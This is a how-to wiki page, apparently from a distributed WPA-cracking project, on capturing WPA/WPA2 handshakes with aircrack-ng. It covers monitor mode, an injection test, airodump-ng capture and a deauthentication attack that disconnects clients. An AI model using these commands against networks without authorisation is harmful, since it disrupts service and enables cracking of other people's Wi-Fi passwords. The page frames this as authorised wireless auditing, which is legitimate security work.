# Prerequisites #
  1. Permission from the owner(s) of wireless network(s)
  1. aircrack-ng suite (we will be using airmon-ng, aireplay-ng, airodump-ng in this article)
  1. A compatible wireless card
  1. You must have root access in order to run all the commands below.
  1. MAC address of the access point(AP) `<MAC_AP>`
  1. Channel used by AP `<CHANNEL_AP>`
  1. Wireless interface used for packet capture `<WLANX>`

# Injection Test #
Before you can start packet capture, you must test whether you can successfully perform an injection test to make sure that your wireless card works with aircrack-ng suite of tools.
  * Step 1: Set your card to monitor mode
```
airmon-ng start <WLANX> <CHANNEL_AP>
```

  * Step 2: Use aireplay-ng to perform injection
```
 aireplay-ng --test -a <MAC_AP> <WLANX>
```
Analyse the output to see your wireless card can successfully inject packets.

# Packet Capture #
_Tip_: You can use the script startcapture to perform data capture , instead of performing the steps below.
To obtain the script run the command:
```
svn checkout http://distributed-wpa-cracking.googlecode.com/svn/trunk/datacapture
cd datacapture
chmod u+x startcapture
```
The script takes the following parameters as input:
```
startcapture -i <WLANX> -c <CHANNEL_AP> -b <MAC_AP> -w <MAC_CLIENT> -f <CAPTURE_FILENAME>
```
Here `<CAPTURE_FILENAME>` is the prefix for files to which the capture is written. Use `sudo` is applicable.

## Alternative Capture Method ##

  * Step 1: Set your card to monitor mode. This step is not required, if your card is already in monitor mode.
```
airmon-ng start <WLANX> <CHANNEL_AP>
```

  * Step 2: Start packet capture
```
airodump-ng -c <CHANNEL_AP> --bssid <MAC_AP> -w <CAPTURE_FILENAME> <WLANX>
```
> > Here `<CAPTURE_FILENAME>` is the prefix for files to which the capture is written. Please remember that in order to crack WPA/WPA2-PSK a handshake between a client and AP must be captured by airodump-ng. Therefore, you must continue to capture packets until you see the text "WPA Handshake" on the top-right corner of the airodump-ng screen.

  * Step 3: Deauth a client(Optional, but recommended). We can use aireplay-ng in order to send a deauthentication packet to a client, which then attempts to reauthenticate with the AP, so that we can capture the handshake between the client and AP. While airodump-ng is running, please make note of the MAC address of a client `<MAC_CLIENT>` currently connected to the AP and in a separate console run the following command.
```
aireplay-ng -0 <NUM_PACKETS> -a <MAC_AP> -c <MAC_client> <WLANX>
```
> > Here `<NUM_PACKETS>` is the number of deauthentication packets to send. Usually a single packet is enough, but you may want to re-try with more packets, in case of failed attempts.

In case the above steps do not work for you,please refer to the detailed instructions found on the aircrack-ng website, given in [HowtoCaptureData#References](HowtoCaptureData#References.md)

# References #
  * http://www.aircrack-ng.org/
  * http://www.aircrack-ng.org/doku.php?id=compatibility_drivers
  * http://www.aircrack-ng.org/doku.php?id=cracking_wpa
  * [BackTrack Linux distro](http://www.backtrack-linux.org/) that has aircrack pre-installed.  Also has a downloadable virtual machine which is handy for capturing wifi data.  Just add our capture script to it, a compatible wireless card, and you're ready to go.